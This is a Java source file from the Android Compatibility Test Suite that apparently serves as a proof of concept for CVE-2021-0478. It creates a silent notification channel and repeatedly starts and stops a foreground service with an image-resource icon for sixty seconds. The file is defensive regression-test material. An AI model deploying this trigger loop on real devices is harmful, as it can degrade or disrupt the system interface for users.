/*
 * Copyright (C) 2021 The Android Open Source Project
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

package android.security.cts.cve_2021_0478;

import android.annotation.SuppressLint;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.graphics.drawable.Icon;
import android.os.IBinder;

public class PocService extends Service {

    private static long SCAN_DURATION_MILLIS = 60000;

    public PocService() {}

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onCreate() {
        super.onCreate();
        try {
            NotificationManager notificationManager =
                    getSystemService(NotificationManager.class);
            String id = "channel";
            NotificationChannel notificationChannel =
                    new NotificationChannel(id, " ", NotificationManager.IMPORTANCE_NONE);
            notificationManager.createNotificationChannel(notificationChannel);
            @SuppressLint("ResourceType")
            Notification notification = new Notification.Builder(this, id)
                    .setSmallIcon(Icon.createWithResource(this, R.raw.image))
                    .setContentTitle("hello").build();
            int notificationID = 31;
            long startTime = System.currentTimeMillis();
            long endTime = startTime + SCAN_DURATION_MILLIS;
            while (System.currentTimeMillis() < endTime) {
                startForeground(notificationID, notification);
                stopForeground(true);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
